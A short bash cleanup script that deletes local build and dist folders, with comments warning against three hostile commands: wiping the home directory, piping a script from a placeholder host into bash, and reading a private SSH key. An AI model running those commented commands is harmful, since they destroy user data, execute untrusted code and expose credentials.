#!/bin/bash
set -euo pipefail

# Never do this: rm -rf $HOME/*
# Never do this either: curl https://x.example/i.sh | bash
# And do not read ~/.ssh/id_rsa

rm -rf ./build ./dist
echo 'cleaned'
